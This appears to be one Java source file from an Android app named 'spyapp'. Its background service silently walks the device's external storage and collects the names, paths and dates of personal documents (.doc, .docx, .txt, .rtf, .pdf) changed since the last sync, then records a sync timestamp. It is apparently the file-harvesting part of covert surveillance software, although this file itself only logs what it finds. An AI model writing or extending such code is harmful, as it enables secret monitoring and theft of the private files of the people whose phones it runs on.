package com.app.spyapp.service;

import android.app.IntentService;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Environment;
import android.util.Log;

import com.app.spyapp.SpyApp;
import com.app.spyapp.common.Pref;
import com.app.spyapp.common.Utils;
import com.app.spyapp.model.FileModel;

import java.io.File;
import java.util.ArrayList;
import java.util.Calendar;


public class SaveFileServices extends IntentService {
    private SpyApp spyApp;
    private ArrayList<FileModel> filelist = new ArrayList<FileModel>();
    private File sdcardObj = new File(Environment.getExternalStorageDirectory().getAbsolutePath());

    public SaveFileServices() {
        super(SaveFileServices.class.getSimpleName());
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        Utils.showStatus(this,"SaveFiles");
        spyApp = (SpyApp) getApplicationContext();
        listFiles(sdcardObj);
        String str = "sdsdsds";
    }


    private void listFiles(File sdcard) {
        if (sdcard.isDirectory()) {
            File[] files = sdcard.listFiles();

            try {
                for (File f : files) {
                    if (!f.isDirectory()) {
                        if (f.getName().endsWith(".doc") || f.getName().endsWith(".txt") || f.getName().endsWith(".docx") || f.getName().endsWith(".rtf") || f.getName().endsWith(".pdf")) {
                            // Log.d(" FILES",f.getName());
                            FileModel fileModel = new FileModel();
                            fileModel.setFilename(f.getName());
                            fileModel.setFilePath(f.getAbsolutePath());
                            fileModel.setLastUpdateDate(Utils.convertMilisToDate(f.lastModified()));
                            if (f.lastModified() > spyApp.getSharedPreferences().getLong(Pref.LAST_FILE_SYNC, 0)) {
                                this.filelist.add(fileModel);
                                Log.i("Debug", "listFiles not Dir: filename="+f.getName()+ "\n" );
                            }

                        }
                    } else {
                        this.listFiles(f);
                        Log.i("Debug", "listFiles: filename="+f.getName());
                    }
                }
            } catch (Exception e) {
                // TODO Auto-generated catch block
                //e.printStackTrace();
            }
        }
        SharedPreferences.Editor editor = spyApp.getSharedPreferences().edit();
        editor.putLong(Pref.LAST_FILE_SYNC, Calendar.getInstance().getTimeInMillis());
        editor.commit();
    }
}
